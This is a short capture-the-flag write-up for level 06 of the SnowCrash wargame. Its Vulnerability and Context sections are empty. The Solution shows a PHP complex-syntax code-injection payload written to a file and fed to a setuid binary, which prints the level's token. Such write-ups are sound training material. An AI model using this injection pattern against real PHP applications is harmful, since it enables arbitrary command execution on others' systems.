# Level 06

## Vulnerability

## Context

## Solution

```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
```

```
level06@SnowCrash:~$ cat /tmp/getflag
[x {${`getflag`}}]
```

```
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
